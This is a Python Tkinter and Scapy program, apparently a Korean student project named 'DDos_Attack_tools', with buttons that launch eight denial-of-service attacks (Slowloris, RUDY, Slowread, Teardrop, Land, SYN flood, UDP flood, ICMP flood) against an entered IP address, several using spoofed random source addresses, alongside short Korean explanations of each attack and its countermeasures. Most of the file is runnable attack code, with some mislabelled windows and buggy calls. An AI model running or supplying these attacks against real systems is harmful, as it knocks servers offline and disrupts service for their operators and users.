import tkinter
from tkinter import *
from scapy.all import *
import threading
import socket
import sys
import time
import string
import random
class exbutton_win():
    def Slowloris_exbutton_win(self):
        nh = tkinter.Tk()
        nh.title("Slowloris Attack 설명문")
        nh.geometry("400x250+450+450")

        slowloris_label = Label(nh, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="Slowloris Attack")
        slowloris2_label = Label(nh, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                             "   - HTTP Header 정보를 비정상적으로 조작하여 웹 서버가\n     온전한 Header 정보가 올 때까지 기다리게 함\n"
                                                                             "   - 서버가 연결 상태를 유지할 수 있는 자원은 한계가\n     있으므로 임계치를 넘겨서 다른 정상적인 접근을\n     거부하게 만듬\n\n"
                                                                             "  대응법\n"
                                                                             "   - 방화벽 등을 통해서 세션 임계치 제한을 설정")
        slowloris_label.pack()
        slowloris2_label.pack()

        return nh.mainloop()
    def Land_exbutton_win(self):
        ng = tkinter.Tk()
        ng.title("Land Attack 설명문")
        ng.geometry("400x250+450+450")
        Land_label = Label(ng, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="Land Attack")
        Land2_label = Label(ng, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                             "   - 출발지와 목적지가 같은 패킷을 만들어 공격 대상이\n     자기 자신에게 응답하도록 해서 시스템적인부하를\n     발생시킴\n\n"
                                                                             "  대응법\n"
                                                                             "   - 현재 대부분의 OS에서 해당 취약점을 해결하여\n     이론적으로만 존재하는 공격")
        Land_label.pack()
        Land2_label.pack()

        return ng.mainloop()
    def TCP_exbutton_win(self):
        nf = tkinter.Tk()
        nf.title("TCP Flood 설명문")
        nf.geometry("400x250+450+450")
        TCP_label = Label(nf, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="TCP Flood")
        TCP2_label = Label(nf, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                       "   - 클라이언트가 SYN만 보내고 다른 동작을 하지않으면\n     해당하는 연결 요청 시간동안 SYN으로 가득 차게되고\n     그럼 서버는 더 이상의 연결 요청을 받을 수가 없게된다\n\n"
                                                                       "  대응법\n"
                                                                       "   - TCP연결 만료 시간을 짧게 설정\n   - 방화벽으로 의심 패킷에 대한 차단 정책 설정\n   - SYN Cookie를 사용")

        TCP_label.pack()
        TCP2_label.pack()

        return nf.mainloop()
    def UDP_exbutton_win(self):
        ne = tkinter.Tk()
        ne.title("UDP Flood 설명문")
        ne.geometry("400x250+450+450")
        UDP_label = Label(ne, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="UDP Flood")
        UDP2_label = Label(ne, justify=LEFT, height=50, width=70, text="Udp Flooding Attack\n"
                                                                        "  정의\n"
                                                                        "   - SYN Flooding Attack과는 다르게 네트워크 대역폭을\n     소모시키는 것이 목적인 공격\n"
                                                                        "   - 공격자가 다량의 UDP 패킷을 서버로 전송하여 서버가\n     보유한 네트워크 대역폭을 소진시켜 다른 클라이언트의\n     접속을 불안정하게 만드는 공격\n\n"
                                                                        "  대응법\n"
                                                                        "   - 미사용 UDP 포트 차단, 방화벽 패킷 필터링")

        UDP_label.pack()
        UDP2_label.pack()

        return ne.mainloop()
    def ICMP_exbutton_win(self):
        nd = tkinter.Tk()
        nd.title("ICMP Flood 설명문")
        nd.geometry("400x250+450+450")
        ICMP_label = Label(nd, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="ICMP Flood")
        ICMP2_label = Label(nd, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                        "   - 다량의 ICMP 패킷을 서버로 전송하여 서버가 보유한 네트워크\n     대역폭을 가득 채워 다른 사용자의접속을 원활하지 못하도록\n     유발시키는 공격\n\n"
                                                                        "  대응법\n"
                                                                        "   - 미사용 UDP 포트 차단, 방화벽 패킷 필터링\n\n")

        ICMP_label.pack()
        ICMP2_label.pack()

        return nd.mainloop()
    def RUDY_exbutton_win(self):
        nc = tkinter.Tk()
        nc.title("RUDY Attack 설명문")
        nc.geometry("400x250+450+450")
        RUDY_label = Label(nc, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="RUDY Attack")
        RUDY2_label = Label(nc, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                        "   - HTTP POST 메소드를 이용하여 서버로 전달할 대량의 데이터를\n     장시간에 걸쳐 분할 전송하며, 서버는 POST 데이터를 모두 수신하지\n     "
                                                                        "않았다고 판단하여 연결을 장시간 유지하므로 서버의 가용량을\n     소비하게 되어 다른 클라이언트의 정상적인 서비스를 방해하는\n     서비스 거부 공격\n\n"
                                                                        "  대응법\n"
                                                                        "   - 동시 연결에 대한 임계치 설정\n   - 연결 Timeout 설정\n   - Content-length 크기에 대한 임계치 설정\n\n")

        RUDY_label.pack()
        RUDY2_label.pack()

        return nc.mainloop()
    def Teardrop_exbutton_win(self):
        nb = tkinter.Tk()
        nb.title("Teardrop Attack 설명문")
        nb.geometry("400x250+450+450")
        Teardrop_label = Label(nb, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="Teardrop Attack")
        Teardrop2_label = Label(nb, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                            "   - 정상적으로 패킷을 전송할 때 IP Fragmentation이 발생하면\n     패킷을 재조립할 때 오프셋 값을 더하게 된다\n"
                                                                            "   - Fragmentation내의 오프셋 값을 변형시켜 보내면 재조립할 때\n     시스템이 오류를 일으켜 붕괴되거나 리부팅이 발생하게\n     되어서 저장하지 않은 데이터를 손실 시키는 공격\n\n"
                                                                            "  대응법\n"
                                                                            "   - Teardrop을 비롯한 IP Fragmentation을 이용한 공격은\n     대부분의 시스템에 패치되어 최근에는 실효성이\n     없는 공격")

        Teardrop_label.pack()
        Teardrop2_label.pack()

        return nb.mainloop()
    def Slowread_exbutton_win(self):
        na = tkinter.Tk()
        na.title("ICMP Flood 설명문")
        na.geometry("400x250+450+450")
        Slowread_label = Label(na, justify=CENTER, height=1, width=15, font=("맑은 고딕", 15), text="ICMP Flood")
        Slowread2_label = Label(na, justify=LEFT, height=50, width=70, text="  정의\n"
                                                                            "   - TCP 세그먼트 헤더 중 Window Size 값을 '0' 또는\n     작은 크기로 조작하여 전송함으로써 웹서버의\n     Connection 자원을 고갈시키는 공격\n"
                                                                            "   - Slowread 공격 기법은 대부분의 Apache 웹서버가\n     연결지연을 제한하지 않는 사실을 이용한다.\n\n"
                                                                            "  대응법\n"
                                                                            "   - 비정상적으로 작은 Window Size의 SYN 패킷을\n     차단하는 방법으로 방어할 수 있다.\n\n")

        Slowread_label.pack()
        Slowread2_label.pack()

        return na.mainloop()


class GUIMODE():
    def __init__(self):
        win = tkinter.Tk()

        self.Packet_write = threading.Thread(target=self.file_packet)  # txt파일로 저장
        self.Packet_write.start()


        win.title("DDos_Attack_tools")
        win.configure(bg='white')
        win.geometry("730x600+250+250")
        win.resizable(False, False)

        right_frame = tkinter.Frame(win, relief="raised", bd=1)
        left_frame = tkinter.Frame(win, relief="raised", bd=1)

        right_frame.pack(side="right", fill="both", expand=True)
        left_frame.pack(side="left", fill="both", expand=True)

        self.ip_dst_data = tkinter.StringVar()

        textbox = Entry(left_frame, textvariable=self.ip_dst_data)  # dst_IP 텍스트 공간 부여

        self.packet=Label(left_frame,width=50,height=30,text="패킷 내용: \n count : 500 \n해당 파일에  txt파일과 pcap파일이 저장되어있을겁니다.")

        photo = PhotoImage(file="3-way-handshaking.png")
        imageLabel = Label(right_frame, image=photo)
        imageLabel.pack()

        dos_manual=tkinter.Text(right_frame,width=52,height=29)
        dos_manual.insert(tkinter.CURRENT,"3-Way-Handshaking\n"
                                          "  동작순서\n"
                                          "  1. 클라이언트가 서버에게 SYN을 보내 통신 가능\n     여부 확인\n"
                                          "  2. 서버가 SYN을 받고 클라이언트에게 SYN/ACK를 회\n     신하여 준비가 되었다고 알림\n"
                                          "  3. 클라이언트가 SYN/ACK를 받고 서버에게 ACK를 보\n     내 전송을 시작함\n\n")

        Slowloris_exbutton = Button(right_frame, text="Slowloris 설명문", height=1, width=15)
        Slowloris_exbutton.bind("<Button>", exbutton_win.Slowloris_exbutton_win)


        land_exbutton = Button(right_frame, text="Land 설명문", height=1, width=15)
        land_exbutton.bind("<Button>", exbutton_win.Land_exbutton_win)




        TCP_exbutton = Button(right_frame, text="TCP Flood 설명문", height=1, width=15)
        TCP_exbutton.bind("<Button>", exbutton_win.TCP_exbutton_win)


        UDP_exbutton = Button(right_frame, text="UDP Flood 설명문", height=1, width=15)
        UDP_exbutton.bind("<Button>", exbutton_win.UDP_exbutton_win)


        ICMP_exbutton = Button(right_frame, text="ICMP Flood 설명문", height=1, width=15)
        ICMP_exbutton.bind("<Button>", exbutton_win.ICMP_exbutton_win)

        RUDY_exbutton = Button(right_frame, text="Rudy 설명문", height=1, width=15)
        RUDY_exbutton.bind("<Button>", exbutton_win.RUDY_exbutton_win)


        Teardrop_exbutton = Button(right_frame, text="Teardrop 설명문", height=1, width=15)
        Teardrop_exbutton.bind("<Button>", exbutton_win.Teardrop_exbutton_win)


        Slowread_exbutton = Button(right_frame, text="Slowread 설명문", height=1, width=15)
        Slowread_exbutton.bind("<Button>", exbutton_win.Slowread_exbutton_win)

        Slowloris_exbutton.place(x=70, y=475)
        land_exbutton.place(x=70, y=501)
        TCP_exbutton.place(x=70, y=527)
        UDP_exbutton.place(x=70, y=553)
        ICMP_exbutton.place(x=185, y=475)
        RUDY_exbutton.place(x=185, y=501)
        Teardrop_exbutton.place(x=185, y=527)
        Slowread_exbutton.place(x=185, y=553)

        self.packet.grid(row=0)
        textbox.place(x = 70, y = 450 ,width=200, height=30)  # 텍스트 칸 위치 선정
        dos_manual.place(x = 0,y= 224)

        self.dst_port = 80
        self.s_port = RandNum(1024, 65535)  # 포트 랜덤
        self.intercount = 0  # 카운터 재기
        self.count = 20  # 몇번 반복할지 GUI 상에 설정
        self.Random = RandNum(1000, 9000)  # 무작위 설정 1000~9000
        self.s_ip = RandIP()

        self.packet = threading.Thread(target=self.packet_temp)  # pcap파일로 저장
        self.packet.start()

        # 버튼 위젯 생성
        slowloris_button = Button(left_frame, text="Slowloris 공격문", command=self.Slowloris, height=1, width=15)
        land_button = Button(left_frame, text="Land 공격문", command=self.land,height=1,width=15)
        tcp_flood_button = Button(left_frame, text="TCP Flood 공격문", command=self.tcp_flood, height=1, width=15)
        udp_flood_button = Button(left_frame, text="UDP Flood 공격문", command=self.udp_flood,height=1,width=15)
        rudy_button = Button(left_frame, text="Rudy 공격문", command=self.rudy,height=1,width=15)
        Teardrop_button = Button(left_frame, text="Teardrop 공격문", command=self.Teardrop,height=1,width=15)
        ICMP_button = Button(left_frame, text="ICMP Flood 공격문", command=self._ICMP,height=1,width=15)
        Slowread_button = Button(left_frame, text="Slowread 공격문", command=self.Slowread, height=1, width=15)

        #버튼 위젯 위치 선언
        slowloris_button.place(x = 70, y = 475)
        land_button.place(x = 70, y = 501)
        tcp_flood_button.place(x = 70, y = 527)
        udp_flood_button.place(x = 70, y = 553)
        ICMP_button.place(x = 185, y = 475)
        rudy_button.place(x = 185, y = 501)
        Teardrop_button.place(x = 185, y = 527)
        Slowread_button.place(x=185, y=555)

        win.mainloop()

    def showPacket(self, packet):
        packet.show()

    def packet_temp(self):
        packet_result = sniff(iface="VMware Network Adapter VMnet1", filter='ip', prn=self.showPacket, count=1000)
        wrpcap("packet.pcap", packet_result)

    def file_packet(self):
        f = open("packet.txt", "w")
        sys.stdout = f


    def Slowread(self):
        dst_ip = self.ip_dst_data.get()
        headers = [
            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
        ]
        data = (random.choice(string.ascii_letters + string.digits)) * 1000  # 데이터
        for x in range(0, self.count):
            i = IP(src=self.s_ip, dst=dst_ip)  # 출발지 주소는 Random으로 설정하였습니다.
            t = TCP(sport=self.s_port, dport=self.dst_port, window=0)
            packet = "GET / HTTP/1.1\r\n" + \
                     "Host: {}\r\n".format(dst_ip) + \
                     "Connection: keep-alive\r\n" + \
                     "Cache-Control: max-age=0\r\n" + \
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" + \
                     "Upgrade-Insecure-Requests: 1\r\n" + \
                     "{0}\r\n{1}\r\n".format(headers[0], headers[1]) + \
                     "Accept-Encoding: gzip, deflate, sdch\r\n" + \
                     "Connection: Keep-Alive\r\n"
            send(i / t / packet / data)

    def rudy(self): #rudy 김진
        dst_ip = self.ip_dst_data.get()
        useragents = [
            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
        ]

        for i in range(self.count):



            socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
            socks.connect((dst_ip, self.dst_port))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결

            send(bytes("Post /http/1.1\r\n", encoding="utf-8"))
            send(
                bytes("Host {}\r\n".format(dst_ip).encode("utf-8")))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
            send(bytes("User-agent {}\r\n".format(random.choice(useragents)).encode("utf-8")))
            send(bytes("connection Keep-alive\r\n", encoding="utf-8"))
            send(bytes("Keep-alive 900\r\n", encoding="utf-8"))
            send(bytes("content Length 10000\r\n", encoding="utf-8"))
            send(bytes("Content type application/x-www-form-urlencoded\r\n\r\n", encoding="utf-8"))
            for i in range(0, 9000):
                Random = random.choice(string.ascii_letters + string.digits).encode('utf-8')
                socks.send(Random)
                # time.sleep(random.uniform(0.1, 3))  # 0.1초에서 3초사이에 느린 속도로 천천히 보내준다.
                # 그럼 세션이 연결된 상태에서 byte가 천천히 오기때문에 웹서버는 기다려야한다.
            self.intercount += 1
            socks.close()

    def Teardrop(self):
        dst_ip = self.ip_dst_data.get()
        data=random.choice(string.ascii_letters + string.digits)
        for i in range(self.count):
            _id = random.choice(range(1, 65535))
            # flag가 MF 로 설정하고 재조시립시 필요한 id값 전송
            send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF")/UDP(sport=self.s_port,dport=self.dst_port)/((data*1420))))

            # flag를 정의하지않으면 0으로 명시된다. frag offset값은 비트*8이다. 그래서 130*8은 1040으로 정의된다.
            send((IP(src=self.s_ip,dst=dst_ip,id=_id,frag=130))/(data*1420))

            # frag는 2800을 의미하고 offset이 2800byte임을 의미한다.
            send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF",frag=350)/UDP(sport=self.s_port,dport=self.dst_port)/(data*1420)))

            # flags=0 비트값을 0으로 설정할 시 패킷의 마지막임을 의미한다. 종단 패킷임을 뜻한다. frag는 4160 즉 offset 이 4160byte임을 뜻한다.
            send((IP(src=self.s_ip, dst=dst_ip, id=_id,flags=0, frag=520)/UDP(sport=self.s_port,dport=self.dst_port))/(data*1420))

    def Slowloris(self): # Slowloris 유주환
        dst_ip = self.ip_dst_data.get()

        # 헤더의 변수에 User-agent 사용자정보와 사용자언어를 넣었다.
        headers = [
            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
        ]

        # 소켓을 리스트 형식으로 선언
        sockets = []
        def setupSocket(ip):  # http 헤더
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
            sock.settimeout(4)  # 타임아웃 4초 설정
            sock.connect((ip, 80))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결
            sock.send("GET /?{} HTTP/1.1\r\n".format(RandNum(0,1337)).encode("utf-8"))  # send로 http 헤더값을 전송한다. \r\n으로 줄바꿈을 시킨다.
            for header in headers:
                sock.send("{}\r\n".format(header).encode("utf-8"))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.

            return sock  # 객체 sock 안에 저장되어있는 http헤더를 리턴





        for _ in range(self.count):
            try:  # 예외처리
                sock = setupSocket(dst_ip)  # ip를 넣고 sock 이라는 객체에 저장한다.
            except socket.error:  # 에러가 났을시 break문 실행
                break

            sockets.append(sock)  # 아까 만들었던 sockets 라는 리스트에 sock을 추가한다.

        # 해당 포트가 닫혀있거나 연결할수있는 클라이언트가 꽉차거나 에러가 나서 while 문으로 넘어간다.

        for i in range(1, self.count):

            for sock in list(sockets):  # sockets 객체에 저장되어있는 것들을 sock에 저장한다.
                try:
                    sock.send("X-a: {}\r\n".format(RandNum(0,4600)).encode(
                        "utf-8"))  # http 헤더로 X -a: 1~4600 까지 랜덤한 수를 전송 http 헤더를
                    # 불완전하게 전송한다.

                except socket.error:  # 에러가 났을시 sockets 안에 sock 리스트에 들어있는 값을 지운다.
                    sockets.remove(sock)

            for _ in range(self.count - len(sockets)):  # count - len(sockets) 만큼 반복문을 진행한다.

                try:
                    sock = setupSocket(dst_ip)  # HTTP 헤더 정보 생성
                    if sock:
                        sockets.append(sock)  # sockets 리스트 맨뒤에 sock을 추가한다.
                except socket.error:
                    break  # 에러시 break 문


    def _ICMP(self):

        dst_ip = self.ip_dst_data.get()
        data = (string.ascii_letters + string.digits)*20
        for x in range(0, self.count):  # 보낼 패킷의 범위
            icmpf=IP(src=self.s_ip,dst=dst_ip)/ICMP()/(data)
            send(icmpf)  # ICMP 전송
    def land(self):   # land 김진
        dst_ip = self.ip_dst_data.get()

        i = IP(src=dst_ip, dst=dst_ip)  #보낼 패킷을 입력한 주소와 함께 넣어준다
        i.proto = 6
        tu = TCP(dport=80, sport=9001, flags=0x002) # 지정한 포트와 syn값을 tu 변수에 넣어준다.


        for x in range(0, self.count): #count 정도의 패킷을 반복적으로 전송한다.
            self.intercount += 1
            send(i/tu/"hello word")




    def tcp_flood(self):    #tcp flood 이태서

        dst_ip = self.ip_dst_data.get()


        i = IP(src=self.s_ip, dst=dst_ip) # 임의의 출발지 IP 생성 함수
        t = TCP(sport=self.Random, dport=self.dst_port, flags="S", seq=self.Random, window=self.Random) # 방화벽 탐지 설정 교란을 위한 무작위 숫자 추출 함수
        for Firewall_disturb in range(0, self.count):
            send(i / t, verbose=0)




    def udp_flood(self): # udp flood 정재훈
        dst_ip = self.ip_dst_data.get() #목적지 IP 설정
        duration = 100 #공격시간 설정
        timeout = time.time() + duration #공격시간 초과여부를 timeout 변수로 저장
        sent = 0

        for i in range(self.count):
            if time.time() > timeout:  #설정한 공격시간이 지나면 종료
                break
            else:
                pass  #지나지 않으면 아래의 내용 반복
            _ip = IP(src=RandIP(), dst=dst_ip) #출발IP 무작위 설정 / 목적지 아이피 설정
            _udp = UDP(sport=self.s_port, dport=self.dst_port) #출발포트 무작위 설정 / 목적지 포트 설정
            send(_ip / _udp, verbose=0) #생성한 임의의 IP 설정으로 패킷 전송
            sent += 1





application=GUIMODE()
